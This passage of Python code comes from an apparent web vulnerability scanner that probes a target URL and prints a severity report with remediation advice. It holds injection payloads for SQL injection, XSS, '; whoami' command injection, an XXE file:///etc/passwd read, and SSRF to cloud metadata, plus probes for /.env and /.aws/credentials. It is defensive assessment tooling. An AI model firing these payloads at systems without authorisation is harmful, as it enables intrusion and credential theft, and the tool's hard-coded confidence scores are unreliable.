                'description': f'Technologies detected: {", ".join(technologies)}',
                'impact': 'Known technologies may have documented vulnerabilities.',
                'remediation': 'Keep all frameworks and libraries updated to latest versions.'
            })
            scan_stats['findings'] += 1
    except:
        scan_stats['errors'] += 1
    
    print(f"\n{Colors.WARNING}[PHASE 2: INJECTION ATTACKS]{Colors.ENDC}\n")
    
    # Test 5-7: SQL Injection (Enhanced)
    sqli_payloads = [
        ("'", "Error-based"),
        ("' OR '1'='1", "Authentication bypass"),
        ("1' AND SLEEP(3)--", "Time-based blind"),
    ]
    
    for payload, technique in sqli_payloads:
        current_test += 1
        progress_bar(current_test, total_tests, prefix='Phase 2', suffix=f'SQLi ({technique})')
        time.sleep(0.3)
        
        try:
            parsed = urlparse(target)
            test_url = f"{target}{'&' if parsed.query else '?'}id={payload}"
            
            start_time = time.time()
            req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
            response = urlopen(req, timeout=10)
            elapsed = time.time() - start_time
            content = response.read().decode('utf-8', errors='ignore').lower()
            scan_stats['requests_sent'] += 1
            
            # SQL error patterns
            sql_errors = [
                'sql syntax', 'mysql', 'postgresql', 'ora-', 'sqlite',
                'syntax error', 'database error', 'odbc', 'jdbc'
            ]
            
            if any(err in content for err in sql_errors):
                vulnerabilities['critical'].append({
                    'name': f'SQL Injection Vulnerability ({technique})',
                    'cvss': '9.8',
                    'confidence': '95%',
                    'cve': 'CWE-89',
                    'description': f'SQL injection detected using {technique} technique. Payload: {payload}',
                    'impact': 'Complete database compromise possible. Attacker can read, modify, or delete data.',
                    'remediation': 'Use parameterized queries (prepared statements). Never concatenate user input with SQL.'
                })
                scan_stats['findings'] += 1
                break
            
            # Time-based detection
            if 'SLEEP' in payload and elapsed >= 3:
                vulnerabilities['critical'].append({
                    'name': 'Time-based Blind SQL Injection',
                    'cvss': '9.1',
                    'confidence': '90%',
                    'cve': 'CWE-89',
                    'description': f'Time-based SQLi detected. Response delayed by {elapsed:.2f} seconds.',
                    'impact': 'Database information can be extracted through timing attacks.',
                    'remediation': 'Use parameterized queries and input validation.'
                })
                scan_stats['findings'] += 1
                break
                
        except HTTPError as e:
            if e.code == 500:
                vulnerabilities['high'].append({
                    'name': 'SQL Injection - Server Error',
                    'cvss': '8.6',
                    'confidence': '85%',
                    'cve': 'CWE-89',
                    'description': f'Server returned 500 error for SQLi payload: {payload}',
                    'impact': 'Possible SQL injection. Server error indicates backend query failure.',
                    'remediation': 'Implement proper error handling and use parameterized queries.'
                })
                scan_stats['findings'] += 1
        except:
            scan_stats['errors'] += 1
    
    # Test 8-10: XSS Testing (Enhanced)
    current_test += 1
    progress_bar(current_test, total_tests, prefix='Phase 2', suffix='XSS (Reflected)')
    time.sleep(0.3)
    
    xss_payloads = [
        '<script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
    ]
    
    xss_found = False
    for payload in xss_payloads:
        try:
            test_url = f"{target}{'&' if '?' in target else '?'}q={payload}"
            req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
            response = urlopen(req, timeout=5)
            content = response.read().decode('utf-8', errors='ignore')
            scan_stats['requests_sent'] += 1
            
            if payload in content:
                vulnerabilities['high'].append({
                    'name': 'Reflected Cross-Site Scripting (XSS)',
                    'cvss': '7.1',
                    'confidence': '95%',
                    'cve': 'CWE-79',
                    'description': f'XSS vulnerability detected. Payload reflected: {payload}',
                    'impact': 'Attacker can execute malicious scripts in victim browser, steal cookies, hijack sessions.',
                    'remediation': 'Implement proper output encoding and Content Security Policy (CSP).'
                })
                scan_stats['findings'] += 1
                xss_found = True
                break
        except:
            scan_stats['errors'] += 1
    
    # Test 11: Command Injection
    current_test += 1
    progress_bar(current_test, total_tests, prefix='Phase 2', suffix='Command Injection')
    time.sleep(0.3)
    
    try:
        cmd_payload = '; whoami'
        test_url = f"{target}{'&' if '?' in target else '?'}cmd={cmd_payload}"
        req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
        response = urlopen(req, timeout=5)
        content = response.read().decode('utf-8', errors='ignore').lower()
        scan_stats['requests_sent'] += 1
        
        if any(indicator in content for indicator in ['root', 'www-data', 'administrator', 'uid=']):
            vulnerabilities['critical'].append({
                'name': 'OS Command Injection',
                'cvss': '10.0',
                'confidence': '90%',
                'cve': 'CWE-78',
                'description': 'Command injection vulnerability detected. OS commands can be executed.',
                'impact': 'Complete system compromise. Attacker can execute arbitrary OS commands.',
                'remediation': 'Never pass user input to shell commands. Use safe APIs instead.'
            })
            scan_stats['findings'] += 1
    except:
        scan_stats['errors'] += 1
    
    # Test 12: XML External Entity (XXE)
    current_test += 1
    progress_bar(current_test, total_tests, prefix='Phase 2', suffix='XXE Injection')
    time.sleep(0.3)
    
    try:
        xxe_payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        req = Request(target, 
                     data=xxe_payload.encode(),
                     headers={
                         'User-Agent': 'Mozilla/5.0',
                         'Content-Type': 'application/xml'
                     })
        response = urlopen(req, timeout=5)
        content = response.read().decode('utf-8', errors='ignore')
        scan_stats['requests_sent'] += 1
        
        if 'root:' in content or '/bin/bash' in content:
            vulnerabilities['critical'].append({
                'name': 'XML External Entity (XXE) Injection',
                'cvss': '9.1',
                'confidence': '90%',
                'cve': 'CWE-611',
                'description': 'XXE vulnerability detected. External entities are processed.',
                'impact': 'File disclosure, SSRF, DoS attacks possible.',
                'remediation': 'Disable external entity processing in XML parser.'
            })
            scan_stats['findings'] += 1
    except:
        scan_stats['errors'] += 1
   
    print(f"\n{Colors.OKBLUE}[PHASE 3: AUTHENTICATION]{Colors.ENDC}\n")
    
    # Test 13: Weak Authentication
    current_test += 1
    progress_bar(current_test, total_tests, prefix='Phase 3', suffix='Auth Bypass Check')
    time.sleep(0.3)
    
    try:
        admin_paths = ['/admin', '/administrator', '/wp-admin', '/phpmyadmin', '/cpanel']
        
        for path in admin_paths:
            test_url = target.rstrip('/') + path
            req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
            
            try:
                response = urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore').lower()
                scan_stats['requests_sent'] += 1
                
                # Check if accessible without authentication
                if response.getcode() == 200 and 'login' not in content and 'password' not in content:
                    vulnerabilities['critical'].append({
                        'name': f'Admin Panel Without Authentication: {path}',
                        'cvss': '9.1',
                        'confidence': '85%',
                        'cve': 'CWE-306',
                        'description': f'Administrative interface accessible without authentication at {path}',
                        'impact': 'Unauthorized access to admin functions. Complete application compromise.',
                        'remediation': 'Implement strong authentication on all administrative interfaces.'
                    })
                    scan_stats['findings'] += 1
                    break
            except HTTPError:
                pass
            except:
                scan_stats['errors'] += 1
    except:
        scan_stats['errors'] += 1
    
    # Test 14: Session Management
    current_test += 1
    progress_bar(current_test, total_tests, prefix='Phase 3', suffix='Session Security')
    time.sleep(0.3)
    
    try:
        from http.cookiejar import CookieJar
        from urllib.request import HTTPCookieProcessor, build_opener
        
        cookie_jar = CookieJar()
        opener = build_opener(HTTPCookieProcessor(cookie_jar))
        
        req = Request(target, headers={'User-Agent': 'Mozilla/5.0'})
        response = opener.open(req, timeout=10)
        scan_stats['requests_sent'] += 1
        
        cookies = list(cookie_jar)
        
        for cookie in cookies:
            issues = []
            
            # Check Secure flag
            if not cookie.secure and target.startswith('https://'):
                issues.append('Missing Secure flag')
            
            # Check HttpOnly flag
            if not cookie.has_nonstandard_attr('HttpOnly'):
                issues.append('Missing HttpOnly flag')
            
            # Check SameSite
            if not cookie.has_nonstandard_attr('SameSite'):
                issues.append('Missing SameSite attribute')
            
            if issues:
                vulnerabilities['medium'].append({
                    'name': f'Insecure Cookie Configuration: {cookie.name}',
                    'cvss': '5.3',
                    'confidence': '100%',
                    'cve': 'CWE-614',
                    'description': f'Cookie security issues: {", ".join(issues)}',
                    'impact': 'Cookies vulnerable to interception (Secure), XSS (HttpOnly), CSRF (SameSite).',
                    'remediation': 'Set Secure, HttpOnly, and SameSite=Strict attributes on all cookies.'
                })
                scan_stats['findings'] += 1
    except:
        scan_stats['errors'] += 1
    
    # Test 15: CSRF Protection
    current_test += 1
    progress_bar(current_test, total_tests, prefix='Phase 3', suffix='CSRF Check')
    time.sleep(0.3)
    
    try:
        req = Request(target, headers={'User-Agent': 'Mozilla/5.0'})
        response = urlopen(req, timeout=5)
        content = response.read().decode('utf-8', errors='ignore').lower()
        scan_stats['requests_sent'] += 1
        
        has_csrf_token = any(token in content for token in [
            'csrf', '_token', 'authenticity_token', 'anti-forgery'
        ])
        
        has_forms = '<form' in content
        
        if has_forms and not has_csrf_token:
            vulnerabilities['medium'].append({
                'name': 'Missing CSRF Protection',
                'cvss': '6.5',
                'confidence': '80%',
                'cve': 'CWE-352',
                'description': 'Forms detected without CSRF tokens',
                'impact': 'Users can be tricked into performing unwanted actions.',
                'remediation': 'Implement anti-CSRF tokens on all state-changing forms.'
            })
            scan_stats['findings'] += 1
    except:
        scan_stats['errors'] += 1
    
    print(f"\n{Colors.PURPLE}[PHASE 4: CONFIGURATION]{Colors.ENDC}\n")
    
    # Test 16-20: Security Headers (Comprehensive)
    current_test += 1
    progress_bar(current_test, total_tests, prefix='Phase 4', suffix='Security Headers')
    time.sleep(0.3)
    
    try:
        req = Request(target, headers={'User-Agent': 'Mozilla/5.0'})
        response = urlopen(req, timeout=10)
        headers = dict(response.headers)
        scan_stats['requests_sent'] += 1
        
        security_headers = {
            'X-Frame-Options': ('Clickjacking protection', 'high'),
            'X-Content-Type-Options': ('MIME sniffing protection', 'medium'),
            'X-XSS-Protection': ('XSS filter', 'low'),
            'Content-Security-Policy': ('XSS/injection protection', 'high'),
            'Referrer-Policy': ('Information leakage protection', 'low'),
            'Permissions-Policy': ('Feature policy', 'low'),
        }
        
        for header, (description, severity) in security_headers.items():
            if header not in headers:
                cvss_scores = {'high': '6.5', 'medium': '4.3', 'low': '3.7'}
                
                vulnerabilities[severity].append({
                    'name': f'Missing Security Header: {header}',
                    'cvss': cvss_scores[severity],
                    'confidence': '100%',
                    'cve': 'CWE-693',
                    'description': f'Missing {description}',
                    'impact': f'Increased attack surface. {description} not enabled.',
                    'remediation': f'Add {header} header with appropriate value.'
                })
                scan_stats['findings'] += 1
                
                current_test += 1
                progress_bar(current_test, total_tests, prefix='Phase 4', suffix=f'Missing: {header[:20]}')
                time.sleep(0.2)
    except:
        scan_stats['errors'] += 1
    
    # Test 21: Directory Listing
    current_test += 1
    progress_bar(current_test, total_tests, prefix='Phase 4', suffix='Directory Listing')
    time.sleep(0.3)
    
    try:
        dir_url = target.rstrip('/') + '/'
        req = Request(dir_url, headers={'User-Agent': 'Mozilla/5.0'})
        response = urlopen(req, timeout=5)
        content = response.read().decode('utf-8', errors='ignore').lower()
        scan_stats['requests_sent'] += 1
        
        if 'index of' in content or 'directory listing' in content or 'parent directory' in content:
            vulnerabilities['medium'].append({
                'name': 'Directory Listing Enabled',
                'cvss': '5.3',
                'confidence': '100%',
                'cve': 'CWE-548',
                'description': 'Web server allows directory browsing',
                'impact': 'Sensitive files and directory structure exposed.',
                'remediation': 'Disable directory listing in web server configuration.'
            })
            scan_stats['findings'] += 1
    except:
        scan_stats['errors'] += 1
    
    print(f"\n{Colors.FAIL}[PHASE 5: DATA EXPOSURE]{Colors.ENDC}\n")
    
    # Test 22-26: Sensitive Files (Enhanced)
    sensitive_files = {
        '/.env': ('Environment configuration', 'critical'),
        '/.git/config': ('Git configuration', 'high'),
        '/backup.sql': ('Database backup', 'critical'),
        '/config.php': ('PHP configuration', 'high'),
        '/.htaccess': ('Apache configuration', 'medium'),
        '/web.config': ('IIS configuration', 'high'),
        '/.aws/credentials': ('AWS credentials', 'critical'),
        '/composer.json': ('Composer dependencies', 'low'),
        '/package.json': ('NPM dependencies', 'low'),
        '/.dockerignore': ('Docker configuration', 'low'),
    }
    
    for file_path, (description, severity) in list(sensitive_files.items())[:5]:
        current_test += 1
        progress_bar(current_test, total_tests, prefix='Phase 5', suffix=f'File: {file_path[1:15]}')
        time.sleep(0.3)
        
        try:
            file_url = target.rstrip('/') + file_path
            req = Request(file_url, headers={'User-Agent': 'Mozilla/5.0'})
            response = urlopen(req, timeout=5)
            scan_stats['requests_sent'] += 1
            
            if response.getcode() == 200:
                cvss_scores = {'critical': '9.1', 'high': '7.5', 'medium': '5.3', 'low': '3.7'}
                
                vulnerabilities[severity].append({
                    'name': f'Sensitive File Exposed: {file_path}',
                    'cvss': cvss_scores[severity],
                    'confidence': '100%',
                    'cve': 'CWE-200',
                    'description': f'{description} accessible at {file_path}',
                    'impact': 'Sensitive information disclosure. May contain credentials or configuration.',
                    'remediation': f'Remove {file_path} from web root or restrict access via web server configuration.'
                })
                scan_stats['findings'] += 1
        except HTTPError:
            pass
        except:
            scan_stats['errors'] += 1
    
    print(f"\n{Colors.OKGREEN}[PHASE 6: ADVANCED]{Colors.ENDC}\n")
    
    # Test 27: CORS Misconfiguration
    current_test += 1
    progress_bar(current_test, total_tests, prefix='Phase 6', suffix='CORS Policy')
    time.sleep(0.3)
    
    try:
        req = Request(target, headers={
            'User-Agent': 'Mozilla/5.0',
            'Origin': 'https://evil.com'
        })
        response = urlopen(req, timeout=5)
        headers = dict(response.headers)
        scan_stats['requests_sent'] += 1
        
        if 'Access-Control-Allow-Origin' in headers:
            acao = headers['Access-Control-Allow-Origin']
            
            if acao == '*' or 'evil.com' in acao:
                vulnerabilities['high'].append({
                    'name': 'CORS Misconfiguration',
                    'cvss': '7.5',
                    'confidence': '95%',
                    'cve': 'CWE-942',
                    'description': f'Permissive CORS policy detected: {acao}',
                    'impact': 'Cross-origin resource sharing allows unauthorized access from any domain.',
                    'remediation': 'Restrict CORS to specific trusted origins. Never use wildcard (*).'
                })
                scan_stats['findings'] += 1
    except:
        scan_stats['errors'] += 1
    
    # Test 28: Clickjacking
    current_test += 1
    progress_bar(current_test, total_tests, prefix='Phase 6', suffix='Clickjacking')
    time.sleep(0.3)
    
    try:
        req = Request(target, headers={'User-Agent': 'Mozilla/5.0'})
        response = urlopen(req, timeout=5)
        headers = dict(response.headers)
        scan_stats['requests_sent'] += 1
        
        if 'X-Frame-Options' not in headers and 'Content-Security-Policy' not in headers:
            vulnerabilities['medium'].append({
                'name': 'Clickjacking Vulnerability',
                'cvss': '4.3',
                'confidence': '90%',
                'cve': 'CWE-1021',
                'description': 'No frame-busting protection detected (X-Frame-Options or CSP frame-ancestors)',
                'impact': 'Application can be embedded in iframe for clickjacking attacks.',
                'remediation': 'Add X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors \'none\''
            })
            scan_stats['findings'] += 1
    except:
        scan_stats['errors'] += 1
    
    # Test 29: Open Redirect
    current_test += 1
    progress_bar(current_test, total_tests, prefix='Phase 6', suffix='Open Redirect')
    time.sleep(0.3)
    
    try:
        redirect_params = ['url', 'redirect', 'next', 'return', 'redir', 'target']
        
        for param in redirect_params[:2]:
            test_url = f"{target}{'&' if '?' in target else '?'}{param}=https://evil.com"
            req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
            
            try:
                response = urlopen(req, timeout=5)
                scan_stats['requests_sent'] += 1
                
                # Check if redirected to external domain
                if response.geturl() and 'evil.com' in response.geturl():
                    vulnerabilities['medium'].append({
                        'name': 'Open Redirect Vulnerability',
                        'cvss': '6.1',
                        'confidence': '85%',
                        'cve': 'CWE-601',
                        'description': f'Unvalidated redirect detected via parameter: {param}',
                        'impact': 'Attackers can redirect users to malicious sites for phishing.',
                        'remediation': 'Validate redirect URLs against whitelist. Never redirect to user-supplied URLs.'
                    })
                    scan_stats['findings'] += 1
                    break
            except:
                pass
    except:
        scan_stats['errors'] += 1
    
    # Test 30: Server-Side Request Forgery (SSRF)
    current_test += 1
    progress_bar(current_test, total_tests, prefix='Phase 6', suffix='SSRF Detection')
    time.sleep(0.3)
    
    try:
        ssrf_payloads = [
            'http://localhost',
            'http://127.0.0.1',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
        ]
        
        for payload in ssrf_payloads:
            test_url = f"{target}{'&' if '?' in target else '?'}url={payload}"
            req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
            
            try:
                response = urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore')
                scan_stats['requests_sent'] += 1
                
                # Check for SSRF indicators
                ssrf_indicators = ['localhost', '127.0.0.1', 'ami-id', 'instance-id', 'local-ipv4']
                
                if any(indicator in content for indicator in ssrf_indicators):
                    vulnerabilities['critical'].append({
                        'name': 'Server-Side Request Forgery (SSRF)',
                        'cvss': '9.1',
                        'confidence': '90%',
                        'cve': 'CWE-918',
                        'description': f'SSRF vulnerability detected. Internal resources accessible via: {payload}',
                        'impact': 'Access to internal network, cloud metadata, sensitive services.',
                        'remediation': 'Validate and whitelist all URLs. Block requests to private IP ranges.'
                    })
                    scan_stats['findings'] += 1
                    break
            except:
                pass
    except:
        scan_stats['errors'] += 1
    
    print()
        
    # Calculate scan duration
    scan_duration = time.time() - scan_stats['start_time']
    
    # Calculate totals
    critical_count = len(vulnerabilities['critical'])
    high_count = len(vulnerabilities['high'])
    medium_count = len(vulnerabilities['medium'])
    low_count = len(vulnerabilities['low'])
    info_count = len(vulnerabilities['info'])
    total_count = critical_count + high_count + medium_count + low_count + info_count
    
    # Display comprehensive results
    print(f"\n{Colors.OKCYAN}{'═' * 70}{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.WHITE}SCAN COMPLETED{Colors.ENDC}")
    print(f"{Colors.OKCYAN}{'═' * 70}{Colors.ENDC}\n")
    
    # Scan Statistics
    print(f"{Colors.BOLD}[SCAN STATISTICS]{Colors.ENDC}")
    print(f"  Duration:          {scan_duration:.2f} seconds")
    print(f"  Tests Performed:   {total_tests}")
    print(f"  HTTP Requests:     {scan_stats['requests_sent']}")
    print(f"  Errors:            {scan_stats['errors']}")
    print(f"  Findings:          {total_count}")
    
    if waf_detected:
        print(f"  WAF Detected:      {Colors.WARNING}{waf_detected}{Colors.ENDC}")
    else:
        print(f"  WAF Detected:      {Colors.OKGREEN}None{Colors.ENDC}")
    
    print()
    
    # Vulnerability Summary with visual representation
    print(f"{Colors.WARNING}⚠ [THREAT INTELLIGENCE SUMMARY]{Colors.ENDC}\n")
    
    # Create visual bar chart
    max_count = max(critical_count, high_count, medium_count, low_count, info_count, 1)
    bar_length = 40
    
    def create_bar(count, max_val, color):
        filled = int((count / max_val) * bar_length) if max_val > 0 else 0
        bar = '█' * filled + '░' * (bar_length - filled)
        return f"{color}{bar}{Colors.ENDC}"
    
    print(f"{Colors.FAIL}💥 CRITICAL: {critical_count:2d}  {create_bar(critical_count, max_count, Colors.FAIL)}{Colors.ENDC}")
    print(f"{Colors.FAIL}🔴 HIGH:     {high_count:2d}  {create_bar(high_count, max_count, Colors.FAIL)}{Colors.ENDC}")
    print(f"{Colors.WARNING}🟡 MEDIUM:   {medium_count:2d}  {create_bar(medium_count, max_count, Colors.WARNING)}{Colors.ENDC}")
    print(f"{Colors.OKGREEN}🟢 LOW:      {low_count:2d}  {create_bar(low_count, max_count, Colors.OKGREEN)}{Colors.ENDC}")
    print(f"{Colors.OKBLUE}ℹ️  INFO:     {info_count:2d}  {create_bar(info_count, max_count, Colors.OKBLUE)}{Colors.ENDC}")
    print(f"{Colors.GRAY}{'─' * 70}{Colors.ENDC}")
    print(f"{Colors.PURPLE}📊 TOTAL:    {total_count:2d}{Colors.ENDC}\n")
    
    # Risk Assessment
    print(f"{Colors.BOLD}[RISK ASSESSMENT]{Colors.ENDC}")
    
    risk_score = (critical_count * 10) + (high_count * 7) + (medium_count * 4) + (low_count * 2) + (info_count * 0)
    
    if risk_score >= 50 or critical_count > 0:
        risk_level = "CRITICAL"
        risk_color = Colors.FAIL
        risk_desc = "⚠️  IMMEDIATE ACTION REQUIRED! Critical vulnerabilities detected."
    elif risk_score >= 30 or high_count >= 3:
        risk_level = "HIGH"
        risk_color = Colors.FAIL
        risk_desc = "⚠️  High priority remediation needed. Multiple security issues found."
    elif risk_score >= 15 or medium_count >= 5:
        risk_level = "MEDIUM"
        risk_color = Colors.WARNING
        risk_desc = "⚠️  Moderate security concerns. Remediation recommended."
    elif risk_score >= 5:
        risk_level = "LOW"
        risk_color = Colors.OKGREEN
        risk_desc = "✓ Minor security issues. Low priority remediation."
    else:
        risk_level = "MINIMAL"
        risk_color = Colors.OKGREEN
        risk_desc = "✓ Good security posture. Continue monitoring."
    
    print(f"  Overall Risk Level: {risk_color}{risk_level}{Colors.ENDC}")
    print(f"  Risk Score:         {risk_score}/100")
    print(f"  Assessment:         {risk_desc}\n")
    
    # Top Vulnerabilities Preview
    if total_count > 0:
        print(f"{Colors.BOLD}[TOP 5 CRITICAL FINDINGS]{Colors.ENDC}")
        
        all_vulns = []
        for severity in ['critical', 'high', 'medium']:
            for vuln in vulnerabilities[severity]:
                all_vulns.append((severity, vuln))
        
        for i, (severity, vuln) in enumerate(all_vulns[:5], 1):
            severity_icons = {
                'critical': f"{Colors.FAIL}💥",
                'high': f"{Colors.FAIL}🔴",
                'medium': f"{Colors.WARNING}🟡"
            }
            
            icon = severity_icons.get(severity, '')
            print(f"  {i}. {icon} {vuln['name'][:55]}{Colors.ENDC}")
            print(f"     {Colors.GRAY}CVSS: {vuln['cvss']} | {vuln['cve']}{Colors.ENDC}")
        
        print()
    
    # Compliance Status
    print(f"{Colors.BOLD}[COMPLIANCE STATUS]{Colors.ENDC}")
    
    # OWASP Top 10 Coverage
    owasp_issues = []
    if critical_count > 0 or high_count > 0:
        owasp_issues.append("Injection vulnerabilities detected")
    if any('XSS' in v['name'] for v in vulnerabilities['high']):
        owasp_issues.append("XSS vulnerabilities present")
    if any('Authentication' in v['name'] or 'Auth' in v['name'] for severity in vulnerabilities.values() for v in severity):
        owasp_issues.append("Authentication/Authorization issues")
    
    if owasp_issues:
        print(f"  OWASP Top 10 2021:  {Colors.FAIL}NON-COMPLIANT{Colors.ENDC}")
        for issue in owasp_issues[:3]:
            print(f"    • {issue}")
    else:
        print(f"  OWASP Top 10 2021:  {Colors.OKGREEN}COMPLIANT{Colors.ENDC}")
    
    # Security Headers Score
    header_score = max(0, 6 - sum(1 for v in vulnerabilities['medium'] + vulnerabilities['low'] if 'Header' in v['name']))
    print(f"  Security Headers:   {header_score}/6 {Colors.OKGREEN if header_score >= 4 else Colors.WARNING}{'✓' if header_score >= 4 else '⚠'}{Colors.ENDC}")
    
    print()
    
    # Next Steps
    print(f"{Colors.BOLD}[RECOMMENDED ACTIONS]{Colors.ENDC}")
    
    actions = []
    if critical_count > 0:
        actions.append("1. Address CRITICAL vulnerabilities immediately (within 24 hours)")
    if high_count > 0:
        actions.append(f"2. Fix HIGH severity issues (within 7 days) - {high_count} found")
    if medium_count >= 3:
        actions.append(f"3. Plan remediation for MEDIUM issues (within 30 days) - {medium_count} found")
    if not actions:
        actions.append("1. Maintain current security posture")
        actions.append("2. Schedule regular security assessments")
    
    actions.append("4. Review detailed findings and implement recommended fixes")
    actions.append("5. Generate PDF report for documentation")
    actions.append("6. Schedule follow-up scan after remediation")
    
    for action in actions[:6]:
        print(f"  {action}")
    
    print()
    
    # Status refresh info
    print(f"{Colors.WARNING}⚠ Status will be refreshed automatically every 10 seconds{Colors.ENDC}\n")
    
    # Action buttons
    print(f"{Colors.OKCYAN}┌────────────────────────────────────────────────────────┐")
    print(f"│                   [VIEW VULNERABILITIES]               │")
    print(f"└────────────────────────────────────────────────────────┘{Colors.ENDC}\n")
    
    print(f"{Colors.OKCYAN}┌────────────────────────────────────────────────────────┐")
    print(f"│                   [GENERATE REPORT]                    │")
    print(f"└────────────────────────────────────────────────────────┘{Colors.ENDC}\n")
    
    print(f"{Colors.OKCYAN}┌────────────────────────────────────────────────────────┐")
    print(f"│                   [EXPORT FINDINGS]                    │")
    print(f"└────────────────────────────────────────────────────────┘{Colors.ENDC}\n")
    
    # User options
    print(f"{Colors.BOLD}[OPTIONS]{Colors.ENDC}")
    print("1. View Detailed Vulnerabilities")
    print("2. Generate PDF Report")
    print("3. Generate Text Report")
    print("4. Generate Both Reports")
    print("5. Export Raw JSON Data")
    print("0. Return to Menu\n")
    
    choice = input(f"{Colors.WARNING}[?] Select option: {Colors.ENDC}").strip()
    
    if choice == '1':
        display_vulnerabilities(target, scan_id, vulnerabilities)
    
    elif choice in ['2', '3', '4']:
        print()
        
        if choice in ['2', '4']:
            if FPDF_AVAILABLE:
                loading_animation("Generating PDF report", duration=2, style="pulse")
                pdf_path = generate_pdf_report(target, scan_id, vulnerabilities, scan_mode="FULL SCAN")
                
                if pdf_path:
                    print_success(f"PDF Report: {pdf_path}")
            else:
                print_warning("FPDF not installed. Install with: pip install fpdf")
                if choice == '2':
                    choice = '3'
        
        if choice in ['3', '4']:
            loading_animation("Generating text report", duration=1, style="dots")
            text_path = generate_text_report(target, scan_id, vulnerabilities, scan_mode="FULL SCAN")
            
            if text_path:
                print_success(f"Text Report: {text_path}")
        
        reports_dir = os.path.expanduser("~/drgxel_reports")
        print(f"\n{Colors.OKBLUE}📁 All reports saved to: {reports_dir}{Colors.ENDC}")
    
    elif choice == '5':
        # Export JSON
        import json
        
        reports_dir = os.path.expanduser("~/drgxel_reports")
        os.makedirs(reports_dir, exist_ok=True)
        
        json_data = {
            'scan_id': scan_id,
            'target': target,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'scan_duration': scan_duration,
            'statistics': scan_stats,
            'vulnerabilities': vulnerabilities,
            'summary': {
                'critical': critical_count,
                'high': high_count,
                'medium': medium_count,
                'low': low_count,
                'info': info_count,
                'total': total_count,
                'risk_score': risk_score,
                'risk_level': risk_level
            }
        }
        
        sanitized_target = target.replace('https://', '').replace('http://', '').replace('/', '_').replace(':', '_')
        json_filename = f"leetscanner_{sanitized_target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        json_path = os.path.join(reports_dir, json_filename)
        
        with open(json_path, 'w') as f:
            json.dump(json_data, f, indent=2)
        
        print_success(f"JSON Export: {json_path}")
    
    # Update stats
    update_stats('LeetScanner - Full Scan', target, vuln_found=(total_count > 0))
    log_activity(f"Full scan completed on {target} - {total_count} findings ({critical_count} critical, {high_count} high)")
    
    input(f"\n{Colors.OKGREEN}[Press Enter to continue...]{Colors.ENDC}")

def display_vulnerabilities(target, scan_id, vulnerabilities):
    """Display detailed vulnerability information"""
    clear_screen()
    print_banner()
    
    print(f"\n{Colors.PURPLE}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗")
    print(f"║                  VULNERABILITY REPORT                        ║")
    print(f"╚═══════════════════════════════════════════════════════════════╝{Colors.ENDC}\n")
    
    print(f"{Colors.OKGREEN}✓ TARGET:{Colors.ENDC} {target}")
    print(f"{Colors.GRAY}◼ SCAN ID:{Colors.ENDC} {scan_id}\n")
    
    severity_colors = {
        'critical': Colors.FAIL,
        'high': Colors.FAIL,
        'medium': Colors.WARNING,
        'low': Colors.OKGREEN,
        'info': Colors.OKBLUE
    }
    
    severity_icons = {
        'critical': '💥',
        'high': '🔴',
        'medium': '🟡',
        'low': '🟢',
        'info': 'ℹ️'
    }
    
    severity_order = ['critical', 'high', 'medium', 'low', 'info']
    
    vuln_number = 1
    
    for severity in severity_order:
        vulns = vulnerabilities.get(severity, [])
        
        if not vulns:
            continue
        
        severity_label = severity.upper()
        color = severity_colors[severity]
        icon = severity_icons[severity]
        
        for vuln in vulns:
            print(f"{color}{'─' * 60}{Colors.ENDC}")
            print(f"{icon} {color}[{severity_label}]{Colors.ENDC} {vuln['name']}")
            print(f"{Colors.OKBLUE}🎯 Target:{Colors.ENDC} {target}")
            
            print(f"\n{Colors.GRAY}CVSS Score: {vuln.get('cvss', 'N/A')}{Colors.ENDC}")
            
            if 'cvss_vector' in vuln:
                print(f"{Colors.GRAY}CVSS Vector: {vuln['cvss_vector']}{Colors.ENDC}")
            
            print()
            
            print(f"{Colors.WHITE}📄 Details:{Colors.ENDC}")
            print(f"{vuln.get('description', 'No description available')}\n")
            
            if 'cve' in vuln:
                print(f"{Colors.GRAY}CVE/CWE: {vuln['cve']}{Colors.ENDC}\n")
            
            print(f"{Colors.WARNING}💥 Impact:{Colors.ENDC}")
            impact_text = vuln.get('impact', 'Security risk present')
            print(f"{impact_text}\n")
            
            print(f"{Colors.OKGREEN}🔧 Remediation:{Colors.ENDC}")
            remediation_text = vuln.get('remediation', 'Apply security best practices')
            print(f"{remediation_text}\n")
            
            print(f"{Colors.OKBLUE}ℹ️  Other Information:{Colors.ENDC}")
            print(f"• Confidence: {vuln.get('confidence', 'N/A')}")
            
            if 'source' in vuln:
                print(f"• Source: {vuln['source']}")
            
            if 'tags' in vuln:
                print(f"• Tags: {vuln['tags']}")
            
            print()
            vuln_number += 1
    
    # Calculate summary
    critical_count = len(vulnerabilities.get('critical', []))
    high_count = len(vulnerabilities.get('high', []))
    medium_count = len(vulnerabilities.get('medium', []))
    low_count = len(vulnerabilities.get('low', []))
    info_count = len(vulnerabilities.get('info', []))
    total_count = critical_count + high_count + medium_count + low_count + info_count
    
    print(f"\n{Colors.OKCYAN}{'═' * 60}{Colors.ENDC}")
    print(f"{Colors.BOLD}SUMMARY{Colors.ENDC}")
    print(f"{Colors.OKCYAN}{'═' * 60}{Colors.ENDC}\n")
    
    print(f"{Colors.FAIL}💥 CRITICAL: {critical_count}{Colors.ENDC}")
    print(f"{Colors.FAIL}🔴 HIGH:     {high_count}{Colors.ENDC}")
    print(f"{Colors.WARNING}🟡 MEDIUM:   {medium_count}{Colors.ENDC}")
    print(f"{Colors.OKGREEN}🟢 LOW:      {low_count}{Colors.ENDC}")
    print(f"{Colors.OKBLUE}ℹ️  INFO:     {info_count}{Colors.ENDC}")
